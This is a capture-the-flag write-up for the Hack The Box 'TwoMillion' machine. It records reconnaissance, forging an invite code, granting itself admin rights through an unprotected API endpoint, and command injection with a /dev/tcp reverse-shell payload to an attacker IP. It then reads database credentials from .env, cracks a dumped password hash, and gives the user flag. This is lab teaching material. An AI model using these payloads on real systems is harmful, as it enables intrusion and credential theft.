# TwoMillsion

> IP: [10.10.11.221]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.221 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://2million.htb/
            1. Need to add to /etc/hosts
   2. > nmap -sC -sV 2million.htb
3. HTTP
   1. Navigate to website and inspect source code
      1. This looks like a normal SPA where the navbar scrolls the page
      2. /login
         1. This is a login form, and in here we see something interesting

            ```html
                <script>
                    $(document).ready(function() {
                        localStorage.removeItem('inviteCode');
                    });
                </script>
            ```

            1. This looks like there is an item labled "inviteCode" that is removed
   2. GOBUSTER
      1. > gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. /home
         2. /login
         3. /register
         4. /api
         5. /logout
         6. /404
         7. /invite
4. /INVITE
   1. In here we see the code:

        ```js
            $(document).ready(function() {
                $('#verifyForm').submit(function(e) {
                    e.preventDefault();

                    var code = $('#code').val();
                    var formData = { "code": code };

                    $.ajax({
                        type: "POST",
                        dataType: "json",
                        data: formData,
                        url: '/api/v1/invite/verify',
                        success: function(response) {
                            if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                                // Store the invite code in localStorage
                                localStorage.setItem('inviteCode', code);

                                window.location.href = '/register';
                            } else {
                                alert("Invalid invite code. Please try again.");
                            }
                        },
                        error: function(response) {
                            alert("An error occurred. Please try again.");
                        }
                    });
                });
            });
        ```

        1. We can see if we have the correct inviteCode we will be redirected to /register (which we found earlier in the gobuster scan)
   2. Looking at the scripts we see the inviteapi.min.js file

        ```js
            eval(function(p, a, c, k, e, d) {
                e = function(c) {
                    return c.toString(36)
                }
                ;
                if (!''.replace(/^/, String)) {
                    while (c--) {
                        d[c.toString(a)] = k[c] || c.toString(a)
                    }
                    k = [function(e) {
                        return d[e]
                    }
                    ];
                    e = function() {
                        return '\\w+'
                    }
                    ;
                    c = 1
                }
                ;while (c--) {
                    if (k[c]) {
                        p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
                    }
                }
                return p
            }('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
        ```

        1. Looking at this we can see there is "makeInviteCode"
        2. We also see a how/to/generate
           1. Maybe we can use this to generate our own
   3. CURL
      1. Lets try and use the how to generate
         1. > curl -X POST http://2million.htb/api/v1/invite/how/to/generate
            1. RESPONSE: {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
            2. This looks like ROT13 and just like the hint suggests 
      2. FROM ROT13
         1. "In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"
      3. GENERATE
         1. > curl -X POST http://2million.htb/api/v1/invite/generate
            1. RESPONSE: {"0":200,"success":1,"data":{"code":"VE1FMTItWFVPTU0tQ1BHU1ctRjYyOTU=","format":"encoded"}}
               1. This looks like base64 encoded text
                  1. FROM BASE64 -> "TME12-XUOMM-CPGSW-F6295"
                  2. SUCCESS! We have an invite token
5. /REGISTER
   1. Input the invite token
   2. UN: sample@gmail.com
   3. PW: password1234
6. /LOGIN
   1. SUCCESS!
   2. We are now met with a dashboard
      1. Looking around we see we can download a VPN (openVPN) config file
   3. API
      1. When downloading the config file we see /api/v1/user/vpn/generate
      2. There could be more API points
      3. Lets open this up in burpsuite and look for more endpoints
7. BURPSUITE
   1. Target -> Repeater -> http://2million.htb/api/v1

        ```json
            {
            "v1": {
                "user": {
                    "GET": {
                        "/api/v1": "Route List",
                        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                        "/api/v1/invite/generate": "Generate invite code",
                        "/api/v1/invite/verify": "Verify invite code",
                        "/api/v1/user/auth": "Check if user is authenticated",
                        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                        "/api/v1/user/vpn/download": "Download OVPN file"
                    },
                    "POST": {
                        "/api/v1/user/register": "Register a new user",
                        "/api/v1/user/login": "Login with existing user"
                    }
                },
                "admin": {
                    "GET": {
                        "/api/v1/admin/auth": "Check if user is admin"
                    },
                    "POST": {
                        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
                    },
                    "PUT": {
                        "/api/v1/admin/settings/update": "Update user settings"
                    }
                }
            }
            }
        ```

        1. In here we see several endpoints, especially ones pertaining to ADMIN
           1. Specificaly we see that we can use "auth" to check if we are admin and if not potentially use "update" to setus as admin
   2. ADMIN
      1. GET -> /api/v1/admin/auth
         1. RESPONSE: {"message":false}
      2. PUT -> /api/v1/admin/settings/update
         1. RESPONSE: {"status":"danger","message":"Invalid content type."}
            1. Lets add the content-type: application/json
         2. RESPONSE: {"status":"danger","message":"Missing parameter: email"}
            1. Lets add email
               1. {"email":"sample@gmail.com"}
         3. RESPONSE: {"status":"danger","message":"Missing parameter: is_admin"}
            1. Lets add is_admin and set to true or (1)
               1. {"is_admin":"1"}
         4. RESPONSE:
            1. {"id":25,"username":"sample","is_admin":1}
      3. Now if we go back and check our /api/v1/admin/auth
         1. RSEPONSE: {"message":true}
            1. So we succeeded as setting our user as admin
   3. EXPLOIT
      1. We now need to somehow get code execution
      2. We can more than likely use the /generate api endpoint
      3. POST
         1. /api/v1/admin/vpn/generate
            1. ERROR: {"status":"danger","message":"Missing parameter: username"}
         2. /api/v1/admin/vpn/generate  
            1. Add Content-Type:application/json
            2. Add {"username":";[PAYLOAD-HERE]"}
               1. PAYLOAD -> ls
                  1. Didn't work
               2. PAYLOAD -> ls #
                  1. Database.php, Router.php, VPN, assets, controllers, css, fonts, images, index.php, js, views
               3. PAYLOAD (for revshell) -> bash -c 'bash -i >& /dev/tcp/10.10.15.11/1234 0>&1'
                  1. SUCCESS!!!
8. ENUMERATION
   1. Lets checkout the .env file
      1. > cat .env

            ```env
                DB_HOST=127.0.0.1
                DB_DATABASE=htb_prod
                DB_USERNAME=admin
                DB_PASSWORD=SuperDuperPass123
            ```

            1. In here we see a database username and password, lets see if we can signin and find other credentials
   2. MYSQL
      1. > mysql -uadmin -p
         1. PASS: SuperDuperPass123
      2. > show databases;
         1. htb_prod, information_schema
      3. > use htb_prod;
      4. > show tables;
         1. invite_codes, users
      5. > select * from users;

            ```text
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
                | id | username     | email                      | password                                                     | is_admin |
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
                | 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
                | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
                | 13 | sample       | sample@gmail.com           | $2y$10$6axL2ObRdok.MfInGsYRFeuB4tJdyK69OqeCuMEzzWgqEOYANcGfy |        1 |
                | 14 | test         | test@2million.htb          | $2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW |        0 |
                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
            ```

            1. In here we see several users, in fact we even see our "sample" user, and their hashed passwords
            2. Use the hashes for john-the-ripper
   3. JOHN-THE-RIPPER
      1. > echo "$2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW" > test.hash
      2. > john ./test.hash
         1. RESPONSE: 12345
         2. Now lets try this user
   4. Switch Users
      1. Sign in as test
         1. > su test
         2. RESPOSNE: su: user test does not exist or the user entry does not contain all the required fields
      2. Maybe we need to use the admin user for MYSQL rather then cracking the hash
         1. > su admin
            1. PW: SuperDuperPass123
   5. FLAG
      1. Get the user flag
         1. > cat /home/admin/user.txt
            1. FLAG: `243c095551e2740e5553c033acbbc37b`


## QUESTIONS

1. Submit user flag
   1. `243c095551e2740e5553c033acbbc37b`
2. Submit root flag
